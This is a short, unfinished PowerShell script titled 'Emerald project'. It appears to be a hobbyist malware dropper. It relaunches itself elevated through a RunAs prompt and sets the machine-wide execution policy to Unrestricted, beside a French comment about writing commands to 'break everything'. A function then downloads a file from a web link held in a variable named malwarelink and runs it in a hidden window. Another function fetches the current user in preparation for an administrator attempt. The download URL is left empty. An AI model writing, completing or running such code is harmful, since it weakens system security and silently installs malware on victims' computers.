# Emerald project in PS #
# Martin Lefebvre #
# Funny purpose #
param(
    [switch]$IsRunAsAdmin = $false
)

# Get our script path
$ScriptPath = (Get-Variable MyInvocation).Value.MyCommand.Path

#
# Launches an elevated process running the current script to perform tasks
# that require administrative privileges.  This function waits until the
# elevated process terminates.
#
function LaunchElevated
{
    # Set up command line arguments to the elevated process
    $RelaunchArgs = '-ExecutionPolicy Unrestricted -file "' + $ScriptPath + '" -IsRunAsAdmin'

    # Launch the process and wait for it to finish
    try
    {
        $AdminProcess = Start-Process "$PsHome\PowerShell.exe" -Verb RunAs -ArgumentList $RelaunchArgs -PassThru
    }
    catch
    {
        $Error[0] # Dump details about the last error
        exit 1
    }

    # Wait until the elevated process terminates
    while (!($AdminProcess.HasExited))
    {
        Start-Sleep -Seconds 2
    }
}

function DoElevatedOperations
{
    ####Ecrire des commandes pour tout casser
    Set-ExecutionPolicy Unrestricted -Force LocalMachine
}

function DoStandardOperations
{
    Write-Host "Do standard operations"

    LaunchElevated
}


#
# Main script entry point
#

if ($IsRunAsAdmin)
{
    DoElevatedOperations
}
else
{
    DoStandardOperations
}

function request {

param ()

    $malwareName = ""
    $malwarelink = ""
    $targetpath = ""

    $site = New-Object System.Net.WebClient
    $site = $site.DownloadFile($malwarelink, $targetpath)

    Get-ChildItem -Recurse -Path "C:\" -Name $malwareName
    powershell.exe $malwareName -Windowedstyle hidden
}

Function TrouverUser {

param ()

   ### Récupération de l'utilisateur connecté ###

    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $UsersName = $currentUser.Identities.Name
    
   ### Try administrator ###


}